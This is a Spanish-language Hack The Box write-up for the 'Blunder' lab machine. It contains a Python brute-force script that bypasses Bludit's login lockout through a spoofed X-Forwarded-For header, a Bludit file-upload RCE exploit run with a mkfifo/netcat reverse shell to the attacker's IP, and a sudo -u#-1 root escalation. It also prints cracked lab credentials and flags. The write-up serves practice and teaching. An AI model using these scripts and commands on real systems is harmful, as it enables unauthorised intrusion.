---
layout      : post
title       : "Maquina Blunder - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Blunder/banner3.png
category    : [ hackthebox ]
tags        : [ information leaked, Bludit CMS explotation, bypass IP Blocking (X-Forwarded-For Header), Image File Upload (Playing with .htaccess), Abusing sudo privilege (CVE-2019-14287)]
---

Hoy vamos a resolver la máquina `Blunder` de la plataforma de `hackthebox` correspondiente a una maquina `linux` dificultad facil, la cual explotaremos obteniendo información lekeada y obteniendo credenciales a partir de un ataque de fuerza bruta usando una tecnica de bypass, una vez dispongamos de las credenciales podremos vulnerar el gestor `BLUDIT CMS` que corre la maquina, donde a traves de RCE ganaremos acceso a la maquina y finalmente para escalar privilegios aprovecharemos de una versión vulnerable de `sudo` con la que conseguiremos acceso como el usuario `root`.

Maquina interesante asi que a darle!
 

Vamos a comenzar creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Blunder
❯ ls
 Blunder
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## Enumeración [#](#enumeracion) {#enumeracion}
 

Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.191
PING 10.10.10.191 (10.10.10.191) 56(84) bytes of data.
64 bytes from 10.10.10.191: icmp_seq=1 ttl=63 time=265 ms

--- 10.10.10.191 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 265.087/265.087/265.087/0.000 ms
```
Vemos que la maquina nos responde, con un ttl de `63`correspondiente a una maquina `linux`, ahora procederemos a el escaneo de puertos con la ayuda de `nmap`:

### Escaneo de Puertos

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.191 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 18:55 GMT
Initiating SYN Stealth Scan at 18:55
Scanning 10.10.10.191 [65535 ports]
Discovered open port 80/tcp on 10.10.10.191
Completed SYN Stealth Scan at 18:55, 26.57s elapsed (65535 total ports)
Nmap scan report for 10.10.10.191
Host is up, received user-set (0.13s latency).
Scanned at 2023-06-14 18:55:12 GMT for 26s
Not shown: 65533 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.70 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 21 (920B)
```

Solamente vemos que se encuentra abierto el puerto `80 http`.

### Escaneo de Version y Servicios.

```java
❯ nmap -sCV -p80 10.10.10.191 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 19:00 GMT
Nmap scan report for 10.10.10.191
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
|_http-generator: Blunder

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.64 seconds
```
Visulizamos informacion interesante de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 80   | HTTP     | Apache httpd 2.4.41  |


## Explotación [#](#explotación) {#explotación}

Comenzaremos usando `whatweb`, para enumerar las tecnologias que emplea el servicio web, desde consola.

```bash
❯ whatweb http://10.10.10.191
http://10.10.10.191 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.191], JQuery, MetaGenerator[Blunder], Script, Title[Blunder | A blunder of interesting facts], X-Powered-By[Bludit]
```

La herramienta nos reporta que se el gestor de contenido del servicio web corresponde a un `bludit CMS`.

> Bludit: Bludit es una aplicación web para construir tu propio sitio web o blog en segundos, es completamente gratis y de código abierto

Seguidmente vamos abrir la web en el navegador.

![](/assets/images/HTB/htb-writeup-Blunder/blunder1.PNG)

Observamos que a simple vista la pagina no muestra contenido interesante. Por ello intentaremos enumerar rutas expuestas del servicio con la herramienta `wfuzz`.

* [https://github.com/xmendez/wfuzz](https://github.com/xmendez/wfuzz)

```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.191/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.191/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000026:   200        105 L    303 W      3280 Ch     "about"                                                                                                               
000000259:   301        0 L      0 W        0 Ch        "admin"                                                                                                               
000000124:   200        170 L    918 W      7561 Ch     "0"                                                                                                                   
000002551:   200        110 L    387 W      3959 Ch     "usb"                                                                                                                 
000003295:   200        21 L     171 W      1083 Ch     "LICENSE"      
```

Despues de unos instantes `wfuzz` nos reporta rutas validas, en las cuales podemos ver una de `admin` y si vamos a esa ruta nos redirige a un panel de inicio de sesión.

![](/assets/images/HTB/htb-writeup-Blunder/blunder2.PNG)

Ahora vamos a tratar de validar si existe una ruta `robots.txt`

![](/assets/images/HTB/htb-writeup-Blunder/blunder3.PNG)

Vemos que efectivamente existe, ahora haciendo un poco de guesing quiero pensar que existen otros archivo con la extensión `.txt` en las rutas, asi que nuevamente con `wfuzz` vamos a validar si existen.


```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.191/FUZZ.txt
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.191/FUZZ.txt
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000001765:   200        1 L      4 W        22 Ch       "robots"                                                                                                              
000002495:   200        4 L      23 W       118 Ch      "todo"
```


Podemos ver que ademas del robots.txt, existe un archivo `todo.txt` y si lo visualizamos en el navegador obtenemos un usuario `fergus`.

![](/assets/images/HTB/htb-writeup-Blunder/blunder4.PNG)

Ahora volvamos a el panel de logeo y interceptemos la petición que se realiza con la ayuda de `burpsuite` y el `foxyproxy`.

![](/assets/images/HTB/htb-writeup-Blunder/blunder5.PNG)


Nos abrimos `burpsuite` y vemos como se transmite la petición.

![](/assets/images/HTB/htb-writeup-Blunder/blunder6.PNG)


Vemos que se envia una petición `POST` con algunos parametros, incluidos un `Token CSRF`.


Ahora ya que disponemos de un usuario valido podriamos tratar de mediante un ataque de fuerza bruta obtener la contrasena, pero para ello necesitamos usar un diccionario de contraseñas.


Anterirmente vimos que la pagina web contenia bastante texto, por que podriamos tratar e hacer un diccionario con las palabras usadas, para ello usaremos la herramienta `cewl` y al pasarle la ip de la web podemos crearnos un diccionario en base a sus palabras y lo exportaremos en un fichero de nombre `dictionary.txt`. 


```bash
❯ cewl -w dictionary.txt http://10.10.10.191
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
❯ ls
 dictionary.txt
```

AHora que disponemos de un usuario valido `fergus` y de un diccionario de posibles contraseñas `dictionary.txt`, podemos crearnos un script en `python` para automatizar el proceso de fuerza bruta y averiguar la contraseña valida.

Llamaremos a nuestro `exploit` bludit.py.


```python
#!/usr/bin/python3


from pwn import *
import requests, re


def def_handler(sig, frame):
    print("\n[!]Saliendo...!\n")
    sys.exit(1)

#ctrl_c
signal.signal(signal.SIGINT, def_handler)
#variables_globales
main_url = "http://10.10.10.191/admin/"


def makeRequests():

    s = requests.session()

    passwords = open("dictionary.txt", 'r')

    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando proceso de Fuerza Bruta")
    time.sleep(2)

    counter = 1

    for password in passwords.readlines():
        
        password = password.strip('\n')
       
        p1.status("Probando con la password [%d/349]: %s" % (counter, password))

        r = s.get(main_url)

        tokenCSRF = re.findall(r'name="tokenCSRF" value="(.*?)"', r.text)[0]

        post_data = {
                "tokenCSRF": tokenCSRF,
                "username": "fergus",
                "password": password,
                "save": ''
        }


        r = s.post(main_url, data=post_data)
        counter += 1

        if "Username or password incorrect" not in r.text:
            p1.success("La contraseña es %s" % password)
            sys.exit(0)

if __name__=='__main__':

    makeRequests()
```

Ejecutamos el exploit y despues de unos segundos nos valida que la contraseña es: `King`

```bash
❯ python3 prueba.py
[+] Fuerza Bruta: La contraseña es King
```

Probamos a logearnos en el servicio y vemos que las credenciales son incorrectas, ademas vemos un mensaje que nos dice que nuestra ip fue bloqueada.

![](/assets/images/HTB/htb-writeup-Blunder/blunder8.PNG)


Investigando un poco vemos que existe una forma de bypasear el uso de fuerza bruta en `Bludit`, atraves de la cabezera `X-Forwarded-For`.

* [https://rastating.github.io/bludit-brute-force-mitigation-bypass/](https://rastating.github.io/bludit-brute-force-mitigation-bypass/)


Modificamos nuestro exploit y añadismos la cabezera `X-Forwarded-For`, con el valor de nuestra variable `password`, aprovechando que este por cada iteración sera aleatorio,

```python
#!/usr/bin/python3

from pwn import *
import requests, re


def def_handler(sig, frame):
    print("\n[!]Saliendo...!\n")
    sys.exit(1)

#ctrl_c
signal.signal(signal.SIGINT, def_handler)
#variables_globales
main_url = "http://10.10.10.191/admin/"


def makeRequests():

    s = requests.session()

    passwords = open("dictionary.txt", 'r')

    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando proceso de Fuerza Bruta")
    time.sleep(2)

    counter = 1
    for password in passwords.readlines():
        
        password = password.strip('\n')
        
        p1.status("Probando con la paassword [%d / 349] %s" % (counter, password))

        r = s.get(main_url)

        tokenCSRF = re.findall(r'name="tokenCSRF" value="(.*?)"', r.text)[0]

        post_data = {
                "tokenCSRF": tokenCSRF,
                "username": "fergus",
                "password": password,
                "save": ''
        }

        myHeaders = {
            'X-Forwarded-For': password
        }

        r = s.post(main_url, data=post_data, headers=myHeaders)
        counter += 1

        if "Username or password incorrect" not in r.text:
            p1.success("La contraseña es %s" % password)
            sys.exit(0)

if __name__=='__main__':

    makeRequests()
```

Despues de unos instantes logramos obtener la contraseña del usuario `fergus:RolandDeschain`.

```bash
❯ python3 bludit.py
[.] Fuerza Bruta: Probando con la password the
[+] Fuerza Bruta: La contraseña es RolandDeschain
```

Validamos la contraseña en la pagina de logeo y ganamos acceso a un panel de dashboard.

![](/assets/images/HTB/htb-writeup-Blunder/blunder7.PNG)


Si ahora buscamos vulnerabilidades asociadas a `bludit`, encontramos un exploit en python asociado `Directory Traversal` que deriva en ejecución remota de comandos.  

```bash
❯ searchsploit bludit
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Bludit - Directory Traversal Image File Upload (Metasploit)                                                                                          | php/remote/47699.rb
Bludit 3.13.1 - 'username' Cross Site Scripting (XSS)                                                                                                | php/webapps/50529.txt
Bludit 3.9.12 - Directory Traversal                                                                                                                  | php/webapps/48568.py
Bludit 3.9.2 - Auth Bruteforce Bypass                                                                                                                | php/webapps/48942.py
Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit)                                                                                         | php/webapps/49037.rb
Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass                                                                                           | php/webapps/48746.rb
Bludit 3.9.2 - Directory Traversal                                                                                                                   | multiple/webapps/48701.txt
bludit Pages Editor 3.0.0 - Arbitrary File Upload                                                                                                    | php/webapps/46060.txt
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Nos traemos el exploit y al ejecutarlo nos pide algunos parametros

```bash
❯ searchsploit -m php/webapps/48568.py
  Exploit: Bludit 3.9.12 - Directory Traversal
      URL: https://www.exploit-db.com/exploits/48568
     Path: /usr/share/exploitdb/exploits/php/webapps/48568.py
File Type: Python script, ASCII text executable, with very long lines

Copied to: /home/fmiracle/Git/firtsmiracle.github.io/assets/images/HTB/htb-writeup-Blunder/48568.py
❯ mv 48568.py exploit_bludit.py
❯ python3 exploit_bludit.py


╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔
╠╩╗│  │ │ │││ │   ╠═╝║║║║║║
╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝

 CVE-2019-16113 CyberVaca


usage: exploit_bludit.py [-h] -u URL -user USER -pass PASSWORD -c COMMAND
exploit_bludit.py: error: the following arguments are required: -u, -user, -pass, -c
```

Ejecutamos el exploit con los parametros correspondientes y con `-c` especificamos el comandos que deseamos ejecutar, para ello probaremos enviarnos una traza a nuestra maquina.

```bash
❯ python3 exploit_bludit.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c 'ping 10.10.16.4'


╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔
╠╩╗│  │ │ │││ │   ╠═╝║║║║║║
╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝

 CVE-2019-16113 CyberVaca


[+] csrf_token: 56c6bb6a8ba8cb234b81e3fc60794fa537f591c6
[+] cookie: tg456638i906rknr4n27it5kr3
[+] csrf_token: 0208621fe6b05f215d6f16a7675200b78af3cd2b
[+] Uploading tdbdwfqf.jpg
[+] Executing command: ping 10.10.16.4
[+] Delete: .htaccess
[+] Delete: tdbdwfqf.jpg
```

y vemos que recibimos la traza en nuestro equipo.

```bash
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
20:48:34.774870 IP 10.10.10.191 > 10.10.16.4: ICMP echo request, id 4083, seq 1, length 64
20:48:34.774896 IP 10.10.16.4 > 10.10.10.191: ICMP echo reply, id 4083, seq 1, length 64
20:48:35.702537 IP 10.10.10.191 > 10.10.16.4: ICMP echo request, id 4083, seq 2, length 64
20:48:35.702583 IP 10.10.16.4 > 10.10.10.191: ICMP echo reply, id 4083, seq 2, length 64
20:48:36.774871 IP 10.10.10.191 > 10.10.16.4: ICMP echo request, id 4083, seq 3, length 64
20:48:36.774913 IP 10.10.16.4 > 10.10.10.191: ICMP echo reply, id 4083, seq 3, length 64
20:48:37.615149 IP 10.10.10.191 > 10.10.16.4: ICMP echo request, id 4083, seq 4, length 64
20:48:37.615194 IP 10.10.16.4 > 10.10.10.191: ICMP echo reply, id 4083, seq 4, length 64
```

Lo siguiente sera mandaremos una reverse shell con la versión antigua de `ntcat` haciendo uso de `mkfifo` a nuestra maquina.

```bash
❯ python3 exploit_bludit.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 443 >/tmp/f'


╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔
╠╩╗│  │ │ │││ │   ╠═╝║║║║║║
╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝

 CVE-2019-16113 CyberVaca


[+] csrf_token: cc25e735f2604125be5c2142412dbe2253a33fea
[+] cookie: a8c95lrdmos65m0545e9fflgh4
[+] csrf_token: 0f6fc1b9b0455869059adf72375ddcb9cef563bb
[+] Uploading rubnxlev.jpg
[+] Executing command: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 443 >/tmp/f
[+] Delete: .htaccess
[+] Delete: rubnxlev.jpg
```

Y obtenemos acceso como el usuario `www-data`

```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.191.
Ncat: Connection from 10.10.10.191:47166.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Como de constumbre vamos a otorgarnos una `tty full interactive`.

```bash
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ export TERM=xterm
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ export SHELL=bash
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ stty rows 45 columns 184
```

Enumerando el sistema dentro en el directorio `bludit-3-10-0a`, encontramos el archivo `users.php` con un password en hash que podemos tratar de crackear.


```bash
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php 
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

Para ello usaremos nuestro web de confianza y logramos decifrar la contraseña la cual es `Password120`

* [https://crackstation.net/](https://crackstation.net/)


Con la nueva credencial migramos exitosamente como el usuario `hugo`, nos dirigimos a su directorio personal y visualizamos la primera flag `user.txt`.

```bash
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo
Password: 
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ whoami
hugo
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cd /home/hugo/
hugo@blunder:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
hugo@blunder:~$ cat user.txt 
0ad6d2d9c835f7f10ba8518d29dedc4b
```

## Escalada de Privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Enumerando los privilegios a nivel de `sudoers`, vemos que el usario `hugo`, puede ejecutar una bash como cualquier usuario a exepción de root. Aprovechando esto podemos migrar al usuario `shaun`.

```bash
hugo@blunder:~$ sudo -u shaun bash
shaun@blunder:/home/hugo$ whoami
shaun
shaun@blunder:/home/hugo$ id
uid=1000(shaun) gid=1000(shaun) groups=1000(shaun),4(adm),24(cdrom),30(dip),46(plugdev),119(lpadmin),130(lxd),131(sambashare)
```

Vemos que el usuario `shaun`,se encuntra en el grupo `lxd`, asi que podriamos aprovecharnos de eso para convertirnos en `root`, pero en esta ocasión vamos a realizarlo de otra manera ya que si vemos la version de sudo que se esta empleando corresponde a una vulnerable.

```bash
shaun@blunder:/home/hugo$ sudo --version
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1
```

Buscando un exploit publico encontramos uno referente a `security bypass` y para versiones menores a la 1.8.27, al ser esta una versión menor podemos usar este exploit.

```bash
❯ searchsploit sudo 1.8.
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
sudo 1.8.0 < 1.8.3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypass + Privilege Escalation                                                               | linux/local/25134.c
sudo 1.8.0 < 1.8.3p1 - Format String                                                                                                                 | linux/dos/18436.txt
Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escalation                                                                     | linux/local/37710.txt
Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation                                                                                     | linux/local/42183.c
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow                                                                                                          | linux/local/48052.sh
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow (PoC)                                                                                                    | linux/dos/47995.txt
sudo 1.8.27 - Security Bypass                                                                                                                        | linux/local/47502.py
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Revisamos el codigo del exploit y vemos que solo tenemos que ejecutar la siguiente instrucción `sudo -u#-1 /bin/bash`, pero debemos hacerlo como el usuario `hugo` ya que este tenia el privilegio a nivel de `sudoers`.

Una vez ya como el ususario `root` nos dirigimos a su directorio personal y visualizamos la segunda flag `root.txt.`

```bash
hugo@blunder:~$ sudo -u#-1 /bin/bash
root@blunder:/home/hugo# whoami
root
root@blunder:/home/hugo# cd /root
root@blunder:/root# cat root.txt 
dd6d458838b1d2c778b789eeb79ab063
```


